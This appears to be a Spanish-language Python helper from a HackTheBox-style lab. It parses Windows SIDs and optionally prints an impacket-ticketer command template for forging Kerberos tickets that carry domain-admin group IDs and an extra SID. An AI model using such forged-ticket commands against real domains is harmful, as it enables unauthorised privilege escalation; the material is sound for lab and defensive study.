#!/usr/bin/env python3
"""
salis.py - Parsear SID binario/hex y extraer Domain SID + RID.
Uso:
  ./salis.py 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
  ./salis.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
  ./salis.py S-1-5-21-...-1103
También acepta múltiples argumentos o toma líneas desde stdin si no se pasan args.
Opciones:
  --ticketer    Imprime una plantilla de comando impacket-ticketer usando los valores provistos
                (se piden por stdin: domain, domain-sid, nthash, spn, groups, target)
"""
import sys
import re

def hexstr_from_arg(a: str) -> str:
    a = a.strip()
    # Si ya es SID textual tipo S-1-5-21-... devuelve None (lo parseamos distinto)
    if a.upper().startswith("S-"):
        return None
    # Quitar 0x si existe
    if a.lower().startswith("0x"):
        a = a[2:]
    # Validar hex
    if re.fullmatch(r"[0-9a-fA-F]+", a):
        return a
    return None

def parse_sid_from_hex(hexs: str):
    try:
        b = bytes.fromhex(hexs)
    except Exception as e:
        raise ValueError(f"Hex inválido: {e}")
    if len(b) < 8:
        raise ValueError("Hex demasiado corto para ser un SID válido")
    rev = b[0]
    subcount = b[1]
    id_auth = int.from_bytes(b[2:8], 'big')
    subs = []
    offset = 8
    # comprobar tamaño suficiente
    if len(b) < 8 + 4*subcount:
        raise ValueError("El número de subauthorities no coincide con la longitud del buffer")
    for i in range(subcount):
        subs.append(int.from_bytes(b[offset:offset+4], 'little'))
        offset += 4
    sid_text = "S-{}-{}".format(rev, id_auth) + ''.join(f"-{s}" for s in subs)
    return {
        "sid": sid_text,
        "rev": rev,
        "id_auth": id_auth,
        "subs": subs,
        "rid": subs[-1] if subs else None,
        "hex": hexs.lower()
    }

def parse_sid_text(sid_text: str):
    # Asumimos formato S-1-5-21-...-RID
    parts = sid_text.strip().split('-')
    if parts[0].upper() != 'S':
        raise ValueError("Texto SID no empieza por 'S-'")
    rev = int(parts[1])
    id_auth = int(parts[2])
    subs = [int(x) for x in parts[3:]]
    return {
        "sid": sid_text,
        "rev": rev,
        "id_auth": id_auth,
        "subs": subs,
        "rid": subs[-1] if subs else None,
        "hex": None
    }

def print_entry(e):
    print("SID completa:   ", e['sid'])
    domain_sid = "-".join(e['sid'].split("-")[:-1])
    print("Domain SID:     ", domain_sid)
    print("RID (dec):      ", e['rid'])
    print("RID (hex):      ", hex(e['rid']) if e['rid'] is not None else "N/A")
    if e.get('hex'):
        print("Hex (input):    ", e['hex'])
    print("-"*40)

def ask_ticketer_template(e):
    # Pedimos valores al usuario por stdin one-liner si desea plantilla
    print("\n¿Quieres generar una plantilla impacket-ticketer con este RID? (s/n): ", end="")
    c = sys.stdin.readline().strip().lower()
    if c != 's':
        return
    # Pedimos campos necesarios
    domain = input("domain (ej. SIGNED.HTB): ").strip()
    domain_sid = input(f"domain-sid (ej. S-1-... ) [enter para usar { '-'.join(e['sid'].split('-')[:-1]) }]: ").strip()
    if not domain_sid:
        domain_sid = "-".join(e['sid'].split("-")[:-1])
    nthash = input("nthash (hex) (ej. ef6993...): ").strip()
    spn = input("spn (ej. MSSQLSvc/DC01.SIGNED.HTB:1433): ").strip()
    groups = input("groups (ej. 512,513,520,518,519,544): ").strip()
    target = input("target (principal que quieres generar, p.ej. DC01$ o Administrator): ").strip()
    # Construir comando
    extra_sid = f"{domain_sid}-{e['rid']}"
    cmd = (
        "impacket-ticketer "
        f"-nthash {nthash} "
        f"-domain-sid {domain_sid} "
        f"-domain {domain} "
        f"-spn \"{spn}\" "
        f"-groups {groups} "
        f"-extra-sid {extra_sid} "
        f"-user-id {e['rid']} "
        f"{target}"
    )
    print("\nPlantilla impacket-ticketer:\n")
    print(cmd)
    print("\nSi necesitas que la adapte con otros flags (aesKey, -old-pac, -duration...) dímelo.")

def main(args):
    inputs = args[1:]
    if not inputs:
        # leer stdin línea por línea
        print("Leyendo stdin (una entrada hex/SID por línea). Ctrl+D para terminar.")
        inputs = [line.strip() for line in sys.stdin if line.strip()]
    entries = []
    for a in inputs:
        if not a:
            continue
        # Si parece hex
        h = hexstr_from_arg(a)
        try:
            if h is not None:
                e = parse_sid_from_hex(h)
            else:
                e = parse_sid_text(a)
        except Exception as exc:
            print(f"[!] Error parseando '{a}': {exc}")
            continue
        entries.append(e)

    if not entries:
        print("No se obtuvo ninguna entrada válida.")
        return 1

    for e in entries:
        print_entry(e)
        # preguntar solo si estamos en TTY
        if sys.stdin.isatty():
            ask_ticketer_template(e)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv))
